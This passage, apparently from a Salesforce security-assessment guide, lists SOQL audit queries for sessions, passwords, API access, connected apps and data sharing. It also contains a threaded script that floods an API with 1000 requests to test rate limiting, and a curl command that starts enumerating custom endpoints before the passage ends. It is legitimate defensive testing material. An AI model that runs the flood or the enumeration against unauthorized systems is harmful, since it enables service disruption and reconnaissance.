</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">StartAddress</span><span class="p">,</span><span class="w"> </span><span class="n">EndAddress</span>
</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a><span class="k">FROM</span><span class="w"> </span><span class="n">LoginIpRange</span><span class="w"> </span>
</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span>
</span></code></pre></div></p>
<p><strong>Session Security Settings</strong> (Setup â†’ Security â†’ Session Settings):
- Lock sessions to IP address: âœ“ Enabled
- Lock sessions to domain: âœ“ Enabled<br />
- Force relogin after Login-As-User: âœ“ Enabled
- Enable clickjack protection: âœ“ Enabled
- Enable Content Sniffing protection: âœ“ Enabled
- Enable XSS protection: âœ“ Enabled
- Require HttpOnly attribute: âœ“ Enabled
- Require Secure attribute: âœ“ Enabled</p>
<p><strong>Password Policy Assessment</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="c1">-- Comprehensive password policy analysis</span>
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">MinPasswordLength</span><span class="p">,</span><span class="w"> </span><span class="n">PasswordComplexity</span><span class="p">,</span><span class="w"> </span><span class="n">PasswordExpiration</span><span class="p">,</span>
</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="w">       </span><span class="n">PasswordHistoryRestriction</span><span class="p">,</span><span class="w"> </span><span class="n">MaxLoginAttempts</span><span class="p">,</span><span class="w"> </span><span class="n">LockoutInterval</span><span class="p">,</span>
</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="w">       </span><span class="n">MinPasswordAge</span><span class="p">,</span><span class="w"> </span><span class="n">PasswordQuestion</span><span class="p">,</span><span class="w"> </span><span class="n">QuestionRestriction</span>
</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="k">FROM</span><span class="w"> </span><span class="n">PasswordPolicy</span>
</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>
</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="c1">-- Password policy variations by profile</span>
</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">MinPasswordLength</span><span class="p">,</span><span class="w"> </span><span class="n">PasswordComplexity</span>
</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ProfilePasswordPolicy</span><span class="w"> </span>
</span><span id="__span-45-10"><a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Misconfigurations create attack vectors for session hijacking and brute force attacks.</p>
<h3 id="2-api-security-configuration">2. API Security Configuration</h3>
<p><strong>Objective</strong>: Evaluate API access controls and identify abuse vectors.</p>
<p><strong>API Access Analysis</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="c1">-- Profile API permissions</span>
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">PermissionsApiEnabled</span><span class="p">,</span><span class="w"> </span><span class="n">PermissionsApiUserOnly</span><span class="p">,</span>
</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="w">       </span><span class="n">PermissionsBulkApiHardDelete</span><span class="p">,</span><span class="w"> </span><span class="n">PermissionsConnectOrgToEnvironmentHub</span>
</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="k">FROM</span><span class="w"> </span><span class="n">Profile</span><span class="w"> </span>
</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">PermissionsApiEnabled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span>
</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a>
</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a><span class="c1">-- API usage statistics</span>
</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Application</span><span class="p">,</span><span class="w"> </span><span class="n">Identifier</span><span class="p">,</span><span class="w"> </span><span class="k">Type</span><span class="p">,</span><span class="w"> </span><span class="n">Status</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-46-9"><a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a><span class="w">       </span><span class="n">RequestsLast24Hours</span><span class="p">,</span><span class="w"> </span><span class="n">RequestsLastHour</span>
</span><span id="__span-46-10"><a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ApiUsage</span><span class="w"> </span>
</span><span id="__span-46-11"><a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">RequestsLast24Hours</span><span class="w"> </span><span class="k">DESC</span>
</span><span id="__span-46-12"><a id="__codelineno-46-12" name="__codelineno-46-12" href="#__codelineno-46-12"></a>
</span><span id="__span-46-13"><a id="__codelineno-46-13" name="__codelineno-46-13" href="#__codelineno-46-13"></a><span class="c1">-- REST API endpoints analysis</span>
</span><span id="__span-46-14"><a id="__codelineno-46-14" name="__codelineno-46-14" href="#__codelineno-46-14"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">DeveloperName</span><span class="p">,</span><span class="w"> </span><span class="n">NamespacePrefix</span><span class="p">,</span><span class="w"> </span><span class="n">HttpMethods</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-46-15"><a id="__codelineno-46-15" name="__codelineno-46-15" href="#__codelineno-46-15"></a><span class="w">       </span><span class="n">Description</span><span class="p">,</span><span class="w"> </span><span class="n">Status</span>
</span><span id="__span-46-16"><a id="__codelineno-46-16" name="__codelineno-46-16" href="#__codelineno-46-16"></a><span class="k">FROM</span><span class="w"> </span><span class="n">RestResource</span><span class="w"> </span>
</span><span id="__span-46-17"><a id="__codelineno-46-17" name="__codelineno-46-17" href="#__codelineno-46-17"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Active&#39;</span>
</span></code></pre></div></p>
<p><strong>Connected Apps Security Review</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="c1">-- Connected applications configuration</span>
</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">ContactEmail</span><span class="p">,</span><span class="w"> </span><span class="n">CallbackUrl</span><span class="p">,</span><span class="w"> </span><span class="n">ConsumerKey</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="w">       </span><span class="n">CreatedDate</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span><span class="p">,</span><span class="w"> </span><span class="n">OptionsFullScopeApprovals</span><span class="p">,</span>
</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="w">       </span><span class="n">OptionsRefreshTokenValidityMetric</span><span class="p">,</span><span class="w"> </span><span class="n">RefreshTokenValidityPeriod</span>
</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ConnectedApplication</span><span class="w"> </span>
</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">CreatedDate</span><span class="w"> </span><span class="k">DESC</span>
</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>
</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a><span class="c1">-- OAuth policies analysis</span>
</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">ConnectedApp</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">PolicyType</span><span class="p">,</span><span class="w"> </span><span class="n">PolicyValue</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-47-10"><a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a><span class="w">       </span><span class="n">Description</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span>
</span><span id="__span-47-11"><a id="__codelineno-47-11" name="__codelineno-47-11" href="#__codelineno-47-11"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ConnectedAppOauthPolicy</span>
</span></code></pre></div></p>
<p><strong>API Rate Limiting Testing</strong>:
<div class="language-python highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">test_api_rate_limits</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">session_id</span><span class="p">,</span> <span class="n">num_requests</span><span class="o">=</span><span class="mi">1000</span><span class="p">):</span>
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Test API rate limiting implementation&quot;&quot;&quot;</span>
</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>        <span class="s1">&#39;Authorization&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;Bearer </span><span class="si">{</span><span class="n">session_id</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>        <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span>
</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>    <span class="p">}</span>
</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a>
</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a>    <span class="n">successful_requests</span> <span class="o">=</span> <span class="mi">0</span>
</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a>    <span class="n">rate_limited_requests</span> <span class="o">=</span> <span class="mi">0</span>
</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a>
</span><span id="__span-48-11"><a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">make_request</span><span class="p">():</span>
</span><span id="__span-48-12"><a id="__codelineno-48-12" name="__codelineno-48-12" href="#__codelineno-48-12"></a>        <span class="k">nonlocal</span> <span class="n">successful_requests</span><span class="p">,</span> <span class="n">rate_limited_requests</span>
</span><span id="__span-48-13"><a id="__codelineno-48-13" name="__codelineno-48-13" href="#__codelineno-48-13"></a>        <span class="k">try</span><span class="p">:</span>
</span><span id="__span-48-14"><a id="__codelineno-48-14" name="__codelineno-48-14" href="#__codelineno-48-14"></a>            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
</span><span id="__span-48-15"><a id="__codelineno-48-15" name="__codelineno-48-15" href="#__codelineno-48-15"></a>                <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/services/data/v52.0/sobjects/&quot;</span><span class="p">,</span>
</span><span id="__span-48-16"><a id="__codelineno-48-16" name="__codelineno-48-16" href="#__codelineno-48-16"></a>                <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
</span><span id="__span-48-17"><a id="__codelineno-48-17" name="__codelineno-48-17" href="#__codelineno-48-17"></a>                <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span>
</span><span id="__span-48-18"><a id="__codelineno-48-18" name="__codelineno-48-18" href="#__codelineno-48-18"></a>            <span class="p">)</span>
</span><span id="__span-48-19"><a id="__codelineno-48-19" name="__codelineno-48-19" href="#__codelineno-48-19"></a>            <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span><span id="__span-48-20"><a id="__codelineno-48-20" name="__codelineno-48-20" href="#__codelineno-48-20"></a>                <span class="n">successful_requests</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span id="__span-48-21"><a id="__codelineno-48-21" name="__codelineno-48-21" href="#__codelineno-48-21"></a>            <span class="k">elif</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">429</span><span class="p">:</span>
</span><span id="__span-48-22"><a id="__codelineno-48-22" name="__codelineno-48-22" href="#__codelineno-48-22"></a>                <span class="n">rate_limited_requests</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span id="__span-48-23"><a id="__codelineno-48-23" name="__codelineno-48-23" href="#__codelineno-48-23"></a>        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span><span id="__span-48-24"><a id="__codelineno-48-24" name="__codelineno-48-24" href="#__codelineno-48-24"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Request failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-48-25"><a id="__codelineno-48-25" name="__codelineno-48-25" href="#__codelineno-48-25"></a>
</span><span id="__span-48-26"><a id="__codelineno-48-26" name="__codelineno-48-26" href="#__codelineno-48-26"></a>    <span class="c1"># Rapid fire requests</span>
</span><span id="__span-48-27"><a id="__codelineno-48-27" name="__codelineno-48-27" href="#__codelineno-48-27"></a>    <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
</span><span id="__span-48-28"><a id="__codelineno-48-28" name="__codelineno-48-28" href="#__codelineno-48-28"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_requests</span><span class="p">):</span>
</span><span id="__span-48-29"><a id="__codelineno-48-29" name="__codelineno-48-29" href="#__codelineno-48-29"></a>        <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">make_request</span><span class="p">)</span>
</span><span id="__span-48-30"><a id="__codelineno-48-30" name="__codelineno-48-30" href="#__codelineno-48-30"></a>        <span class="n">threads</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">thread</span><span class="p">)</span>
</span><span id="__span-48-31"><a id="__codelineno-48-31" name="__codelineno-48-31" href="#__codelineno-48-31"></a>        <span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span><span id="__span-48-32"><a id="__codelineno-48-32" name="__codelineno-48-32" href="#__codelineno-48-32"></a>
</span><span id="__span-48-33"><a id="__codelineno-48-33" name="__codelineno-48-33" href="#__codelineno-48-33"></a>        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">100</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span id="__span-48-34"><a id="__codelineno-48-34" name="__codelineno-48-34" href="#__codelineno-48-34"></a>            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span id="__span-48-35"><a id="__codelineno-48-35" name="__codelineno-48-35" href="#__codelineno-48-35"></a>
</span><span id="__span-48-36"><a id="__codelineno-48-36" name="__codelineno-48-36" href="#__codelineno-48-36"></a>    <span class="k">for</span> <span class="n">thread</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
</span><span id="__span-48-37"><a id="__codelineno-48-37" name="__codelineno-48-37" href="#__codelineno-48-37"></a>        <span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span><span id="__span-48-38"><a id="__codelineno-48-38" name="__codelineno-48-38" href="#__codelineno-48-38"></a>
</span><span id="__span-48-39"><a id="__codelineno-48-39" name="__codelineno-48-39" href="#__codelineno-48-39"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Successful: </span><span class="si">{</span><span class="n">successful_requests</span><span class="si">}</span><span class="s2">, Rate limited: </span><span class="si">{</span><span class="n">rate_limited_requests</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-48-40"><a id="__codelineno-48-40" name="__codelineno-48-40" href="#__codelineno-48-40"></a>    <span class="k">if</span> <span class="n">rate_limited_requests</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span id="__span-48-41"><a id="__codelineno-48-41" name="__codelineno-48-41" href="#__codelineno-48-41"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;WARNING: No rate limiting detected&quot;</span><span class="p">)</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Uncontrolled API access enables mass data extraction and abuse.</p>
<h3 id="3-data-loss-prevention-assessment">3. Data Loss Prevention Assessment</h3>
<p><strong>Objective</strong>: Evaluate data loss prevention controls and identify leakage vectors.</p>
<p><strong>Email Security Configuration</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c1">-- Email deliverability settings</span>
</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">BounceManagementCompliance</span><span class="p">,</span><span class="w"> </span><span class="n">IsActive</span>
</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="k">FROM</span><span class="w"> </span><span class="n">EmailDomainKey</span>
</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>
</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="c1">-- Email relay restrictions</span>
</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">EmailAddress</span><span class="p">,</span><span class="w"> </span><span class="n">IsActive</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span>
</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a><span class="k">FROM</span><span class="w"> </span><span class="n">EmailRelay</span><span class="w"> </span>
</span><span id="__span-49-8"><a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">IsActive</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span>
</span></code></pre></div></p>
<p><strong>File Upload/Download Controls</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="c1">-- Content delivery settings</span>
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">DomainName</span><span class="p">,</span><span class="w"> </span><span class="k">Type</span><span class="p">,</span><span class="w"> </span><span class="n">IsActive</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span>
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ContentDomain</span>
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>
</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="c1">-- File sharing settings analysis</span>
</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">ShareType</span><span class="p">,</span><span class="w"> </span><span class="n">ExpirationDate</span><span class="p">,</span><span class="w"> </span><span class="n">AllowDownload</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="w">       </span><span class="n">AllowPreview</span><span class="p">,</span><span class="w"> </span><span class="n">IsPasswordRequired</span>
</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ContentDistribution</span><span class="w"> </span>
</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">ExpirationDate</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">TODAY</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">ExpirationDate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">null</span>
</span></code></pre></div></p>
<p><strong>External Sharing Assessment</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="c1">-- External sharing rules</span>
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">AccountAccessLevel</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a><span class="w">       </span><span class="n">SharedToType</span><span class="p">,</span><span class="w"> </span><span class="n">SharedTo</span>
</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a><span class="k">FROM</span><span class="w"> </span><span class="n">AccountSharingRule</span><span class="w"> </span>
</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">SharedToType</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;Group&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Role&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;RoleAndSubordinates&#39;</span><span class="p">)</span>
</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a>
</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a><span class="c1">-- Guest user sharing</span>
</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">ShareWithId</span><span class="p">,</span><span class="w"> </span><span class="n">AccessLevel</span><span class="p">,</span><span class="w"> </span><span class="n">RowCause</span>
</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a><span class="k">FROM</span><span class="w"> </span><span class="n">AccountShare</span><span class="w"> </span>
</span><span id="__span-51-10"><a id="__codelineno-51-10" name="__codelineno-51-10" href="#__codelineno-51-10"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">ShareWithId</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">UserType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Guest&#39;</span><span class="p">)</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Inadequate DLP controls enable unauthorized data sharing and exfiltration.</p>
<hr />
<h2 id="api-security-testing">API Security Testing</h2>
<h3 id="1-rest-api-security-assessment">1. REST API Security Assessment</h3>
<p><strong>Objective</strong>: Comprehensive REST API security testing including authentication bypass and injection vulnerabilities.</p>
<p><strong>API Endpoint Discovery</strong>:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="c1"># Standard Salesforce REST endpoints</span>
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>/services/data/<span class="w">                    </span><span class="c1"># Data API</span>
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>/services/data/v52.0/sobjects/<span class="w">     </span><span class="c1"># SObject API</span>
</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>/services/data/v52.0/query/<span class="w">        </span><span class="c1"># SOQL Query</span>
</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>/services/data/v52.0/search/<span class="w">       </span><span class="c1"># SOSL Search</span>
</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>/services/data/v52.0/analytics/<span class="w">    </span><span class="c1"># Analytics API</span>
</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a>/services/apexrest/<span class="w">                </span><span class="c1"># Custom Apex REST</span>
</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a>/services/async/<span class="w">                   </span><span class="c1"># Bulk API</span>
</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a>
</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a><span class="c1"># Custom endpoint enumeration</span>
</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a><span class="w">  </span><span class="s2">&quot;https://instance.salesforce.com/services/apexrest/&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\</span>
